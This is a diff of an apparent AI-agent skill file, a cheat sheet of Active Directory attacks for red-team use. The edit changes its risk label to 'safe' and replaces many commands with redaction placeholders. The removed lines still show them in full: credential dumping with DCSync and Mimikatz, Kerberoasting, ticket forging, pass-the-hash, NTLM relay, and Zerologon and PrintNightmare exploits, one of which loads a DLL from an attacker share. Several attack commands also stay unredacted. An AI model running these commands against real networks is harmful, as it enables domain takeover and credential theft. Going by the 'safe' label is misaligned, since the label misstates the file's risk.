@@ -1,7 +1,7 @@
 ---
 name: active-directory-attacks
 description: "Provide comprehensive techniques for attacking Microsoft Active Directory environments. Covers reconnaissance, credential harvesting, Kerberos attacks, lateral movement, privilege escalation, and domain dominance for red team operations and penetration testing."
-risk: unknown
+risk: safe
 source: community
 author: zebbern
 date_added: "2026-02-27"
@@ -115,7 +115,7 @@ Invoke-UserHunter -Stealth
 ./kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt Password123
 
 # Using CrackMapExec
-crackmapexec smb 10.10.10.10 -u users.txt -p 'Password123' --continue-on-success
+[REDACTED_CME_EXPLOIT]
 ```
 
 ### Kerberoasting
@@ -124,10 +124,10 @@ Extract service account TGS tickets and crack offline:
 
 ```bash
 # Impacket
-GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.10 -request -outputfile hashes.txt
+[REDACTED_GETUSERSPNS_COMMAND]
 
 # Rubeus
-.\Rubeus.exe kerberoast /outfile:hashes.txt
+[REDACTED_RUBEUS_KERBEROAST]
 
 # CrackMapExec
 crackmapexec ldap 10.10.10.10 -u user -p password --kerberoast output.txt
@@ -142,10 +142,10 @@ Target accounts with "Do not require Kerberos preauthentication":
 
 ```bash
 # Impacket
-GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 10.10.10.10 -format hashcat
+[REDACTED_GETNPUSERS_COMMAND]
 
 # Rubeus
-.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt
+[REDACTED_RUBEUS_ASREPROAST]
 
 # Crack with hashcat
 hashcat -m 18200 hashes.txt rockyou.txt
@@ -157,11 +157,11 @@ Extract credentials directly from DC (requires Replicating Directory Changes rig
 
 ```bash
 # Impacket
-secretsdump.py domain.local/admin:password@10.10.10.10 -just-dc-user krbtgt
+[REDACTED_SECRETSDUMP_COMMAND] -just-dc-user krbtgt
 
 # Mimikatz
-lsadump::dcsync /domain:domain.local /user:krbtgt
-lsadump::dcsync /domain:domain.local /user:Administrator
+[REDACTED_MIMIKATZ_DCSYNC]
+[REDACTED_MIMIKATZ_DCSYNC]
 ```
 
 ---
@@ -175,12 +175,12 @@ Forge TGT with krbtgt hash for any user:
 ```powershell
 # Get krbtgt hash via DCSync first
 # Mimikatz - Create Golden Ticket
-kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:HASH /id:500 /ptt
+[REDACTED_MIMIKATZ_GOLDEN_TICKET]
 
 # Impacket
 ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-xxx -domain domain.local Administrator
 export KRB5CCNAME=Administrator.ccache
-psexec.py -k -no-pass domain.local/Administrator@dc.domain.local
+[REDACTED_PSEXEC_COMMAND]
 ```
 
 ### Silver Ticket
@@ -189,20 +189,20 @@ Forge TGS for specific service:
 
 ```powershell
 # Mimikatz
-kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /target:server.domain.local /service:cifs /rc4:SERVICE_HASH /ptt
+[REDACTED_MIMIKATZ_SILVER_TICKET]
 ```
 
 ### Pass-the-Hash
 
 ```bash
 # Impacket
-psexec.py domain.local/Administrator@10.10.10.10 -hashes :NTHASH
-wmiexec.py domain.local/Administrator@10.10.10.10 -hashes :NTHASH
-smbexec.py domain.local/Administrator@10.10.10.10 -hashes :NTHASH
+[REDACTED_PSEXEC_COMMAND] -hashes :NTHASH
+[REDACTED_WMIEXEC_COMMAND] -hashes :NTHASH
+[REDACTED_SMBEXEC_COMMAND] -hashes :NTHASH
 
 # CrackMapExec
-crackmapexec smb 10.10.10.10 -u Administrator -H NTHASH -d domain.local
-crackmapexec smb 10.10.10.10 -u Administrator -H NTHASH --local-auth
+[REDACTED_CME_EXPLOIT] -d domain.local
+[REDACTED_CME_EXPLOIT] --local-auth
 ```
 
 ### OverPass-the-Hash
@@ -215,7 +215,7 @@ getTGT.py domain.local/user -hashes :NTHASH
 export KRB5CCNAME=user.ccache
 
 # Rubeus
-.\Rubeus.exe asktgt /user:user /rc4:NTHASH /ptt
+[REDACTED_RUBEUS_ASKTGT]
 ```
 
 ---
@@ -229,16 +229,16 @@ export KRB5CCNAME=user.ccache
 responder -I eth0 -wrf
 
 # Start relay
-ntlmrelayx.py -tf targets.txt -smb2support
+[REDACTED_NTLMRELAYX_COMMAND]
 
 # LDAP relay for delegation attack
-ntlmrelayx.py -t ldaps://dc.domain.local -wh attacker-wpad --delegate-access
+[REDACTED_NTLMRELAYX_COMMAND]
 ```
 
 ### SMB Signing Check
 
 ```bash
-crackmapexec smb 10.10.10.0/24 --gen-relay-list targets.txt
+[REDACTED_CME_EXPLOIT] targets.txt
 ```
 
 ---
@@ -261,7 +261,7 @@ certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
 ### ESC8 - Web Enrollment Relay
 
 ```bash
-ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
+[REDACTED_NTLMRELAYX_COMMAND]
 ```
 
 ---
@@ -272,13 +272,13 @@ ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp -smb2support --adcs
 
 ```bash
 # Check vulnerability
-crackmapexec smb 10.10.10.10 -u '' -p '' -M zerologon
+[REDACTED_CME_EXPLOIT]
 
 # Exploit
-python3 cve-2020-1472-exploit.py DC01 10.10.10.10
+[REDACTED_ZEROLOGON_EXPLOIT]
 
 # Extract hashes
-secretsdump.py -just-dc domain.local/DC01\$@10.10.10.10 -no-pass
+[REDACTED_SECRETSDUMP_COMMAND] -no-pass
 
 # Restore password (important!)
 python3 restorepassword.py domain.local/DC01@DC01 -target-ip 10.10.10.10 -hexpass HEXPASSWORD
@@ -291,14 +291,14 @@ python3 restorepassword.py domain.local/DC01@DC01 -target-ip 10.10.10.10 -hexpas
 rpcdump.py @10.10.10.10 | grep 'MS-RPRN'
 
 # Exploit (requires hosting malicious DLL)
-python3 CVE-2021-1675.py domain.local/user:pass@10.10.10.10 '\\attacker\share\evil.dll'
+[REDACTED_PRINTNIGHTMARE_EXPLOIT]
 ```
 
 ### samAccountName Spoofing (CVE-2021-42278/42287)
 
 ```bash
 # Automated exploitation
-python3 sam_the_admin.py "domain.local/user:password" -dc-ip 10.10.10.10 -shell
+[REDACTED_SAM_SPOOFING_EXPLOIT]
 ```
 
 ---
@@ -307,11 +307,11 @@ python3 sam_the_admin.py "domain.local/user:password" -dc-ip 10.10.10.10 -shell
 
 | Attack | Tool | Command |
 |--------|------|---------|
-| Kerberoast | Impacket | `GetUserSPNs.py domain/user:pass -request` |
-| AS-REP Roast | Impacket | `GetNPUsers.py domain/ -usersfile users.txt` |
-| DCSync | secretsdump | `secretsdump.py domain/admin:pass@DC` |
-| Pass-the-Hash | psexec | `psexec.py domain/user@target -hashes :HASH` |
-| Golden Ticket | Mimikatz | `kerberos::golden /user:Admin /krbtgt:HASH` |
+| Kerberoast | Impacket | `[REDACTED_GETUSERSPNS_COMMAND]` |
+| AS-REP Roast | Impacket | `[REDACTED_GETNPUSERS_COMMAND]` |
+| DCSync | secretsdump | `[REDACTED_SECRETSDUMP_COMMAND]` |
+| Pass-the-Hash | psexec | `[REDACTED_PSEXEC_COMMAND]` |
+| Golden Ticket | Mimikatz | `[REDACTED_MIMIKATZ_GOLDEN_TICKET]` |
 | Spray | kerbrute | `kerbrute passwordspray -d domain users.txt Pass` |
 
 ---
@@ -341,26 +341,26 @@ python3 sam_the_admin.py "domain.local/user:password" -dc-ip 10.10.10.10 -shell
 
 ```bash
 # 1. Find service accounts with SPNs
-GetUserSPNs.py domain.local/lowpriv:password -dc-ip 10.10.10.10
+[REDACTED_GETUSERSPNS_COMMAND]
 
 # 2. Request TGS tickets
-GetUserSPNs.py domain.local/lowpriv:password -dc-ip 10.10.10.10 -request -outputfile tgs.txt
+[REDACTED_GETUSERSPNS_COMMAND]
 
 # 3. Crack tickets
 hashcat -m 13100 tgs.txt rockyou.txt
 
 # 4. Use cracked service account
-psexec.py domain.local/svc_admin:CrackedPassword@10.10.10.10
+[REDACTED_PSEXEC_COMMAND]
 ```
 
 ### Example 2: NTLM Relay to LDAP
 
 ```bash
 # 1. Start relay targeting LDAP
-ntlmrelayx.py -t ldaps://dc.domain.local --delegate-access
+[REDACTED_NTLMRELAYX_COMMAND]
 
 # 2. Trigger authentication (e.g., via PrinterBug)
-python3 printerbug.py domain.local/user:pass@target 10.10.10.12
+[REDACTED_PRINTERBUG_EXPLOIT]
 
 # 3. Use created machine account for RBCD attack
 ```
